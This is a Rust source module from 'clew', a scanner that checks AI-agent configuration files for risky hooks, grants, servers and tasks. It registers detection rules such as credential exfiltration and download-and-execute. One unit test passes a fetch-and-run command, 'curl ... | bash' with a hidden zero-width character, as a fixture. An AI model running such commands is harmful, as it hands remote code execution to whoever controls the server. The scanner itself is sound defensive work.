// SPDX-License-Identifier: Apache-2.0
// Copyright (c) 2026 Sysogen Lda

//! A rule, as something clew holds rather than something it matches on.
//!
//! One rule is one file under [`crate::rules`]. Adding one means writing that
//! file, declaring its module, and giving it a [`RuleId`] and an arm in [`of`],
//! rather than threading a name through every match that wanted to know.

use std::sync::OnceLock;

use crate::autonomy::Autonomy;
use crate::extract::Format;
use crate::finding::{Finding, Position, RuleId, Severity};
use crate::mcp_server::McpServer;
use crate::permission::Permission;
use crate::profile::Profile;
use crate::repo_path::RepoPath;
use crate::rules::{
    agent_runs_unattended, auto_run_task, bypass_permissions, credential_exfiltration,
    decode_and_execute, download_and_execute, invisible_unicode, opaque_hook, plaintext_transport,
    trusted_server, unpinned_remote_package, unprompted_write_access, unrestricted_shell,
    unverified_download,
};
use crate::task::Task;
use crate::yaml::Span;

/// A kind of thing clew judges.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Subject {
    /// A file's whole text: prose, or a hook script.
    Text,
    /// One command a hook registers, and the file that registered it.
    HookCommand,
    /// A mode a configuration file starts an agent in.
    Mode,
    /// One operation a file pre-approves.
    Grant,
    /// One MCP server a file declares.
    Server,
    /// One task a workspace declares.
    Task,
    /// A file that is there and cannot be read.
    Unreadable,
    /// Everything one scan found, judged once rather than file by file.
    Report,
}

/// One mode a scan found, and what is needed to place a finding in its file.
///
/// A report rule is handed these rather than an [`Examined::Mode`] at a time,
/// because what it reads is the set: two keys that each leave one control
/// standing, and together leave none.
///
/// Owned, and holding a position rather than the text it came from. A scan
/// that kept every file declaring a mode open until it ended would hold as
/// many megabytes as it found such files, and the only thing a report rule
/// wanted from the text was where to point.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct FoundMode {
    /// The file that set it.
    pub path: RepoPath,
    /// The mode, as the file wrote it and before anything was masked.
    pub mode: Autonomy,
    /// Where that file wrote the mode's value, when it could be found.
    pub at: Option<Position>,
}

/// One named permissions profile a scan found, and the file defining it.
///
/// A profile is defined in one file and selected in another: Codex applies
/// the configurations from the project root down, so a profile a root file
/// defines is in force for a run in a directory below it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct FoundProfile {
    /// The file that defined it.
    pub path: RepoPath,
    /// The profile.
    pub profile: Profile,
}

impl FoundMode {
    /// A mode found in `source`, placed while that text is still in hand.
    #[must_use]
    pub fn new(path: &RepoPath, mode: &Autonomy, source: &str, format: Format) -> Self {
        Self {
            path: path.clone(),
            mode: mode.clone(),
            at: crate::rules::placed_value(source, format, &mode.key, &mode.value),
        }
    }
}

/// One thing to judge, and where in its file to report it.
///
/// Each carries the place the scan found rather than the text and the count
/// to find it with. A rule is asked about one declaration at a time, so
/// searching inside the rule read the whole file once for every declaration
/// in it; [`crate::place::Places`] reads it once for all of them.
#[derive(Debug, Clone, Copy)]
pub enum Examined<'a> {
    /// A file's whole text.
    Text {
        /// The file.
        path: &'a RepoPath,
        /// Its contents.
        text: &'a str,
    },
    /// One command a hook registers.
    HookCommand {
        /// The file that registered it.
        path: &'a RepoPath,
        /// The command.
        command: &'a str,
        /// The file's text, for quoting the line a finding is on.
        source: &'a str,
        /// How far the file's text the command reaches over, found by the
        /// scan. A rule looking for a line inside the command searches
        /// there and nowhere else, so what it cannot find in this one it
        /// cannot find in the next. `None` where the command could not be
        /// found, which leaves the finding about the file.
        at: Option<Span>,
    },
    /// A mode a file starts an agent in.
    Mode {
        /// The file.
        path: &'a RepoPath,
        /// The mode.
        mode: &'a Autonomy,
        /// The file's text, for quoting the line a finding is on.
        source: &'a str,
        /// Where the file wrote it, found by the scan.
        at: Option<usize>,
    },
    /// One operation a file pre-approves.
    Grant {
        /// The file.
        path: &'a RepoPath,
        /// The grant.
        grant: &'a Permission,
        /// The file's text, for quoting the line a finding is on.
        source: &'a str,
        /// Where the file wrote it, found by the scan.
        at: Option<usize>,
    },
    /// One MCP server a file declares.
    Server {
        /// The file.
        path: &'a RepoPath,
        /// The server.
        server: &'a McpServer,
        /// The file's text, for quoting the line a finding is on.
        source: &'a str,
        /// Where the file declared it, found by the scan.
        at: Option<usize>,
    },
    /// One task a workspace declares.
    Task {
        /// The file.
        path: &'a RepoPath,
        /// The task.
        task: &'a Task,
        /// The file's text, for quoting the line a finding is on.
        source: &'a str,
        /// Where the file wrote its trigger, found by the scan.
        at: Option<usize>,
    },
    /// A file that is there and cannot be read, and why.
    Unreadable {
        /// The file.
        path: &'a RepoPath,
        /// Why it could not be read.
        reason: &'a str,
    },
    /// Everything one scan found.
    ///
    /// The modes, and the permissions profiles a mode may name, because a
    /// mode selecting a profile says nothing on its own about what the agent
    /// may reach. Another part is added when a rule needs it, rather than
    /// carried now against the chance that one will.
    Report {
        /// Every mode the scan found, with the file that set each.
        modes: &'a [FoundMode],
        /// Every named permissions profile the scan found, with its file.
        profiles: &'a [FoundProfile],
        /// The directories the scan found a project root marker in.
        ///
        /// A tool reading a configuration from more than one file walks up
        /// from where it was run and stops at one of these, so a rule
        /// resolving those layers needs to know where they are.
        projects: &'a [RepoPath],
        /// The files the scan could not read or understand.
        ///
        /// One of these between two layers may have overridden either of
        /// them, so a rule resolving layers stops where it cannot see: a
        /// finding joined across one would be about a configuration nobody
        /// has read.
        opaque: &'a [RepoPath],
    },
}

impl Examined<'_> {
    /// Which kind of thing this is.
    #[must_use]
    pub fn subject(&self) -> Subject {
        match self {
            Self::Text { .. } => Subject::Text,
            Self::HookCommand { .. } => Subject::HookCommand,
            Self::Mode { .. } => Subject::Mode,
            Self::Grant { .. } => Subject::Grant,
            Self::Server { .. } => Subject::Server,
            Self::Task { .. } => Subject::Task,
            Self::Unreadable { .. } => Subject::Unreadable,
            Self::Report { .. } => Subject::Report,
        }
    }
}

/// A rule clew applies. One file holds all of it.
pub trait Rule: Sync {
    /// The identifier, which never changes meaning once published.
    fn id(&self) -> RuleId;

    /// The identifier as it is written and suppressed.
    fn name(&self) -> &'static str;

    /// How much a finding under it matters.
    fn severity(&self) -> Severity;

    /// One line, for a listing.
    fn description(&self) -> &'static str;

    /// What it means, and the incident behind it.
    fn detail(&self) -> &'static str;

    /// What to do about a finding under it.
    fn remediation(&self) -> &'static str;

    /// What it reads. The scan offers it nothing else.
    fn reads(&self) -> &'static [Subject];

    /// What it says about one subject.
    fn check(&self, at: &Examined<'_>, width: usize) -> Vec<Finding>;
}

/// The rule a `RuleId` names.
///
/// A match, not a search, so the compiler says when a variant has no rule.
#[must_use]
pub fn of(id: RuleId) -> &'static dyn Rule {
    match id {
        RuleId::InvisibleUnicode => &invisible_unicode::InvisibleUnicode,
        RuleId::OpaqueHook => &opaque_hook::OpaqueHook,
        RuleId::DownloadAndExecute => &download_and_execute::DownloadAndExecute,
        RuleId::DecodeAndExecute => &decode_and_execute::DecodeAndExecute,
        RuleId::CredentialExfiltration => &credential_exfiltration::CredentialExfiltration,
        RuleId::UnverifiedDownload => &unverified_download::UnverifiedDownload,
        RuleId::UnpinnedRemotePackage => &unpinned_remote_package::UnpinnedRemotePackage,
        RuleId::BypassPermissions => &bypass_permissions::BypassPermissions,
        RuleId::UnrestrictedShell => &unrestricted_shell::UnrestrictedShell,
        RuleId::TrustedServer => &trusted_server::TrustedServer,
        RuleId::PlaintextTransport => &plaintext_transport::PlaintextTransport,
        RuleId::AutoRunTask => &auto_run_task::AutoRunTask,
        RuleId::AgentRunsUnattended => &agent_runs_unattended::AgentRunsUnattended,
        RuleId::UnpromptedWriteAccess => &unprompted_write_access::UnpromptedWriteAccess,
    }
}

/// Every rule clew ships, in the order a listing shows them.
///
/// The packs hold them, so a pack's list is the one place a rule is registered.
/// Built once: `judge` asks per file, per hook command and per grant.
#[must_use]
pub fn shipped() -> &'static [&'static dyn Rule] {
    static SHIPPED: OnceLock<Vec<&'static dyn Rule>> = OnceLock::new();
    SHIPPED.get_or_init(|| {
        crate::pack::shipped()
            .iter()
            .flat_map(|pack| pack.rules.iter().copied())
            .collect()
    })
}

/// What the rules a row names say about one thing.
#[must_use]
pub fn judge(at: &Examined<'_>, checks: &[RuleId], width: usize) -> Vec<Finding> {
    let subject = at.subject();
    shipped()
        .iter()
        .filter(|rule| checks.contains(&rule.id()) && rule.reads().contains(&subject))
        .flat_map(|rule| rule.check(at, width))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A rule left out never runs, and nothing else would say so. This is
    /// what the exhaustive matches used to do.
    #[test]
    fn every_rule_is_registered() {
        let registered: Vec<RuleId> = shipped().iter().map(|r| r.id()).collect();

        for rule in RuleId::all() {
            assert!(registered.contains(rule), "{rule:?} is not registered");
        }
        assert_eq!(registered.len(), RuleId::all().len(), "{registered:?}");
    }

    /// `of` ties each id to a rule, but nothing ties a file to an id: one
    /// added to `rules/` and left out of `RuleId` would sit there doing
    /// nothing.
    #[test]
    fn every_rule_file_is_reachable() {
        let dir = concat!(env!("CARGO_MANIFEST_DIR"), "/src/rules");
        let reached: Vec<String> = RuleId::all()
            .iter()
            .map(|id| id.as_str().replace('-', "_") + ".rs")
            .collect();

        let mut files: Vec<String> = std::fs::read_dir(dir)
            .expect("the rules directory")
            .filter_map(|entry| {
                entry
                    .ok()
                    .map(|e| e.file_name().to_string_lossy().into_owned())
            })
            .filter(|name| {
                std::path::Path::new(name)
                    .extension()
                    .is_some_and(|e| e.eq_ignore_ascii_case("rs"))
                    && name != "mod.rs"
            })
            .collect();
        files.sort_unstable();

        for file in &files {
            assert!(
                reached.contains(file),
                "{file} is not reached by any RuleId"
            );
        }
        assert_eq!(files.len(), reached.len(), "{files:?} against {reached:?}");
    }

    #[test]
    fn no_rule_is_registered_twice() {
        let mut ids: Vec<&str> = shipped().iter().map(|r| r.id().as_str()).collect();
        ids.sort_unstable();
        let listed = ids.len();
        ids.dedup();
        assert_eq!(ids.len(), listed, "{ids:?}");
    }

    /// A report and `clew rules` agree about which rule comes first.
    #[test]
    fn the_registry_is_in_listing_order() {
        let registered: Vec<RuleId> = shipped().iter().map(|r| r.id()).collect();

        assert_eq!(registered, RuleId::all());
    }

    #[test]
    fn a_rule_reads_at_least_one_subject() {
        for rule in shipped() {
            assert!(!rule.reads().is_empty(), "{:?} reads nothing", rule.id());
        }
    }

    /// A dispatcher handing a rule the wrong subject cannot make a finding.
    #[test]
    fn a_rule_says_nothing_about_a_subject_it_does_not_read() {
        let path = RepoPath::root().join("CLAUDE.md");
        let every = [
            Subject::Text,
            Subject::HookCommand,
            Subject::Mode,
            Subject::Grant,
            Subject::Server,
            Subject::Unreadable,
        ];

        for rule in shipped() {
            for subject in every {
                if rule.reads().contains(&subject) {
                    continue;
                }
                let at = match subject {
                    Subject::Unreadable => Examined::Unreadable {
                        path: &path,
                        reason: "not valid UTF-8",
                    },
                    _ => Examined::Text {
                        path: &path,
                        text: "curl https://x.invalid | bash\u{200B}",
                    },
                };
                if at.subject() != subject {
                    continue;
                }
                assert!(
                    rule.check(&at, 80).is_empty(),
                    "{:?} answered about {subject:?}",
                    rule.id()
                );
            }
        }
    }
}
